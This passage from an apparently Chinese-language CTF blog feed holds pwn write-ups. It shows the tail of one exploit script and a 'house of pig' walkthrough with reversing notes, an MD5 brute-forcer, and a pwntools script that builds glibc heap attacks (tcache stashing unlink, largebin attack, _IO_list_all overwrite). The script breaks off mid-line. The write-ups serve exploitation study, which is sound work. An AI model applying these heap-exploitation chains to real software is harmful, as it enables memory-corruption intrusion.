class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(fake_stack)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">io += payload</span><br><span class="line">io = io.ljust(<span class="number">0x320</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment">#fake_stack:</span></span><br><span class="line">payload = p64(libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(fake_rdx)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">io+=payload</span><br><span class="line"></span><br><span class="line">io = io.ljust(<span class="number">0x430</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x440</span>,io)<span class="comment"># largebin 0 </span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x430</span>,cyclic(<span class="number">0x430</span>))<span class="comment">#largebin 1</span></span><br><span class="line"><span class="comment"># add(7,0x440,cyclic(0x440))</span></span><br><span class="line"><span class="comment"># add(8,0x420,cyclic(0x420))</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(stderr_addr-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x430</span>, cyclic(<span class="number">0x430</span>))<span class="comment">#calloc chunk6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)<span class="comment">#largebin 1 0x430</span></span><br><span class="line"><span class="comment">#delete(8)</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(heap_base+<span class="number">0x2538</span>-<span class="number">5</span>-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x41f</span>,cyclic(<span class="number">0x41f</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))<span class="comment">#trigger malloc assert</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house of pig xctf2021final复现</title>
      <link href="/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/"/>
      <url>/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>阴间堆风水</p></blockquote><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="修复switch"><a href="#修复switch" class="headerlink" title="修复switch"></a>修复switch</h3><p>0: 0x3985 invalid</p><p>1: 0x3797 add</p><p>2: 0x37B3 show</p><p>3: 0x37cf edit</p><p>4: 0x37eb delet</p><p>5: 0x3807 change role</p><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>通过add函数，猜测出heap_list，heap_size的作用，结合free、edit函数找到两个标志位</p><p>结合每个的大小与偏移，推测出数组的数量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">list</span>[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">int</span> size[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag1[<span class="number">0x18</span>];</span><br><span class="line">    <span class="type">char</span> flag2[<span class="number">0x18</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tmp_house</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">peppa_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_peppasize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">mummy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_mummysize;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">house</span> <span class="title">daddy_house</span>;</span></span><br><span class="line">  <span class="type">int</span> current_daddysize;</span><br><span class="line">  <span class="type">int</span> show_time;</span><br><span class="line">  <span class="type">int</span> edit_time;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol><li>填充1个1和n个0,使信息长度为N*512+448(bit)</li><li>用64bit存储填充前信息长度，加在后面，长度变为(N+1)*512</li><li>装入标准的幻数: A&#x3D;0x67452301, B&#x3D;0xefcdab89, C&#x3D;0x98badcfe, D&#x3D;0x10325476</li><li>四轮循环运算，循环次数为分组个数(N+1)</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    start = <span class="string">&quot;3c4400&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">            s=<span class="string">&#x27;A&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">            <span class="comment">#s=&#x27;B&#x27;+str(i)</span></span><br><span class="line">            <span class="comment">#s=&#x27;C&#x27;+str(i)</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Test %s &quot;</span> % s</span><br><span class="line">            <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(start):</span><br><span class="line">                <span class="built_in">print</span>(s)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A39275120</span></span><br><span class="line"><span class="string">B3332073</span></span><br><span class="line"><span class="string">C75929410</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul><li>add大小0x90~0x430，同一角色size只能增加</li><li>peppa 20次，mummy 10次，daddy 5次</li><li>peppa 0x30i, mummy 0x30i + 0x10, daddy 0x31i + 0x20</li><li>view 2次，edit 8次</li><li>delet后无法delet，切换角色可edit、view</li><li>daddy的add不用一直增加！</li><li>daddy add最后一次时会多calloc0xe8</li></ul><h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><h3 id="role的选择"><a href="#role的选择" class="headerlink" title="role的选择"></a>role的选择</h3><p>注意不同role的堆列表是独立的，同时不同role能修改的位置也不同</p><p>peppa可以修改fd,bk</p><p>mummy可以修改fd_nextsize,bk_nextsize</p><p>因而最好peppa打tcache stashing unlink, mummy打largebin attack</p><p>当然这不是绝对的，我们可以通过UAF达到对同一个堆块的混淆</p><h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h3><p>1.<code>tcache</code>中放<code>5</code>个，<code>smallbin</code>中放两个</p><p>2.将<strong>后进</strong><code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为<code>[target-0x10]</code>(即target为将要加入tchache的chunk的user pointer处），同时将目标地址<code>+0x08</code>处（即target-&gt;bk)的值设置为一个指向可写内存的指针。</p><p> 3.从smallbin中取一个chunk，走完stash流程，目标地址就会被链入tcache中。</p><h3 id="布局的问题"><a href="#布局的问题" class="headerlink" title="布局的问题"></a>布局的问题</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><blockquote><p> 在tcache中放了5个的情况下，如何使两个chunk进入<strong>相同大小</strong>的smallbin？</p></blockquote><p>问题转化为：如何使两个chunk进入相同大小的unsortedbin，而不进入tcache</p><p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230723173130250.png" alt="image-20230723173130250"></p><p>考虑当unsortedbin中只有一个chunk时，分配较小的chunk时会从其中切一块使用，另一块放入lastrmainder（同样是unsortedbin）</p><p>所以我们先获取一个较大的unsortedbin，（这一步通过填满tcache获得），随后malloc一块较小的chunk,就可以获得目标大小的unsortedbin</p><p>注意这里最后需要获得两块unsortedbin,注意避免在分配第二块时把第一块拿掉。我一开始分配的大小为0x150,刚好可以拿掉一个0xa0剩下一个0xa0,但是在分配第二快时就会出现问题</p><p>我的解决方案是，切割0x160的块，从中取出0xb0，刚好剩下0xa0,同时第二次取0xb0时不会出现把获得的unsortedbin取走的情况</p><p>网上的解决方案是：再填另一个tcache，两次用不同的unsortedbin切割，但是这种方法比较浪费次数</p><p>同时，经过计算、微调，我这里切下来的smallbin的fd和bk刚好位于chunk1-&gt;7,1-&gt;8的可写区域</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><blockquote><p>改到_IO_list_all的指针后，如何修改内容？</p></blockquote><p>本题比较阴间的地方是，不能完整地修改一个堆块</p><p>好在出题人给add3加了一个gift,可以申请一个0xe8的完整可写的堆块</p><p>所以最后可以把largebin attack指向的largebin留着，完成add3的最后一步，使得daddy从这个largechunk中切一块，从而直接获得完整的修改权限</p><p>下策是修改large chunk的chain指针，使其指向可写堆块</p><h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>): <span class="comment">#0xa0-0x430</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;message: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">role</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> role == <span class="number">1</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;A39275120&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">2</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;B3332073&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> role == <span class="number">3</span>:</span><br><span class="line">p.sendlineafter(<span class="string">&quot;user:\n&quot;</span>, <span class="string">&quot;C75929410&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0xa0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#2-&gt;4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin-&gt;smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache 0x160</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;7</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#protect 2-&gt;5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#1-&gt;8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0x160</span></span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line">delet(<span class="number">5</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache 0xa0 to 5</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">0</span>)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">3</span>)</span><br><span class="line">delet(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#split into unsorted bin</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>)<span class="comment">#to clear flag0</span></span><br><span class="line">view(<span class="number">7</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x2204a8</span></span><br><span class="line">iolistall = libc_base + <span class="number">0x21a680</span></span><br><span class="line">memset_got = libc_base + <span class="number">0x219188</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;free_hook = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&quot;iolistall = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(iolistall)))</span><br><span class="line">log.success(<span class="string">&quot;memset_got = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(memset_got)))</span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 0 = 1-&gt;7</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x160</span>, cyclic(<span class="number">0x70</span>))<span class="comment">#into smallbin 1-&gt;9</span></span><br><span class="line">delet(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0xb0</span>, cyclic(<span class="number">0x30</span>))<span class="comment">#smallbin 1 = 1-&gt;8</span></span><br><span class="line"><span class="comment">#unsortedbin finished, 1-&gt;9(0x160);2-&gt;5(0xa0);3-&gt;1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;10</span></span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;11</span></span><br><span class="line">delet(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment">#1-&gt;12</span></span><br><span class="line">fixed_largebin_fd = libc_base + <span class="number">0x21a0d0</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x160</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">view(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;daaa&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x13120</span></span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"><span class="comment">#fix it</span></span><br><span class="line">payload = p64(fixed_largebin_fd)*<span class="number">2</span> + cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;6 largebin1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;7 largebin2</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;13 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;8 </span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;14 protect</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x420</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 2-&gt;9 largebin3</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># 1-&gt;15 protect</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin3 1-&gt;16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack1</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">6</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(free_hook + <span class="number">0x8</span>-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin1 1-&gt;17</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x410</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># memsetgot-0x8 -&gt; 2-&gt;9   3-&gt;2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fix largebin&amp;attck2</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delet(<span class="number">7</span>)</span><br><span class="line">payload = p64(heap_base+<span class="number">0x14e60</span>) + p64(iolistall-<span class="number">0x20</span>)+cyclic(<span class="number">0x150</span>)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x430</span>, cyclic(<span class="number">0x160</span>))<span class="comment"># trigger largebin2 1-&gt;18 iolistall-&gt; 